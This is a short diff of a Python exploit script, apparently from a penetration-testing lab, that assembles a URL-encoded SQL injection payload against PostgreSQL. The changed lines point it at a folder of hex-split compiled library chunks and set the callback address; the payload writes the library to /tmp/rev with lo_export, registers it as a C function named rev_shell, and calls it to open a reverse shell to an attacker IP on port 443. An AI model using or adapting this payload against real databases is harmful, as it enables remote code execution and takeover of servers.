@@ -31,7 +31,7 @@ def generate_random_word():
 random_group = generate_random_word()
 
 def list_files():
-    dir= "/home/kali/Downloads/rev_compiled_on_13.9psql/rev/rev_compiled_split/rev_compiled_split_hex"
+    dir= "/home/test/"
     files = os.listdir(dir)
     files = [f for f in files if os.path.isfile(os.path.join(dir, f))]
     files.sort()
@@ -40,7 +40,7 @@ def list_files():
 def create_content():
     file_list= list_files()
     random_num= generate_random_number()
-    dir= "/home/kali/Downloads/rev_compiled_on_13.9psql/rev/rev_compiled_split/rev_compiled_split_hex"
+    dir= "/home/test/"
     count=0
     full_content= ""
     
@@ -55,7 +55,7 @@ def create_content():
         full_content += mytemplate
         count += 1
 
-    end_data= f"SELECT+lo_export({random_num},$$/tmp/rev$$);CREATE+FUNCTION+rev_shell(text,+integer)+RETURNS+integer+AS+$$/tmp/rev$$,+$$rev_shell$$+LANGUAGE+C+STRICT;SELECT+rev_shell($$10.10.14.121$$,443);"
+    end_data= f"SELECT+lo_export({random_num},$$/tmp/rev$$);CREATE+FUNCTION+rev_shell(text,+integer)+RETURNS+integer+AS+$$/tmp/rev$$,+$$rev_shell$$+LANGUAGE+C+STRICT;SELECT+rev_shell($$10.10.18.111$$,443);"
     
     full_content += end_data
     return full_content
